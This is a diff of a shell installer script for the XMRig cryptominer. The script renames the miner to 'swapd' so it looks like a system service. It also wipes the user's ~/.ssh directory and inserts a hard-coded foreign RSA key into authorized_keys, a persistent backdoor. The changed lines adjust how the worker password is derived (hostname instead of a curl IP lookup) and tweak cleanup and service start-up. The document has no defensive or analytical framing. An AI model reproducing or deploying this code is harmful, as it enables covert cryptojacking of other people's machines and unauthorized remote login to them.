@@ -276,10 +276,10 @@ echo "mv $HOME/.swapd/xmrig $HOME/.swapd/swapd"
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
 echo "PASS..."
-#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS=`hostname`
 #PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
-PASS=`sh -c "(curl -4 ip.sb)"`
+#PASS=`sh -c "(curl -4 ip.sb)"`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
@@ -525,7 +525,7 @@ kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'
 
 # echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"
 
-rm -rf $HOME/xmrig* ; apt autoremove -y ; yum autoremove -y;
+rm -rf $HOME/xmrig* ; rm -rf xmrig* ; apt autoremove -y ; yum autoremove -y;
 
 rm -rf xmrig* config.json*
 
@@ -535,7 +535,8 @@ echo "[*] Generating ssh key on server"
 cd ~ && rm -rf .ssh && rm -rf ~/.ssh/authorized_keys && mkdir ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
-systemctl restart swapd
+systemctl status swapd
+systemctl start swapd
 systemctl status swapd
 
 echo "[*] Setup complete"
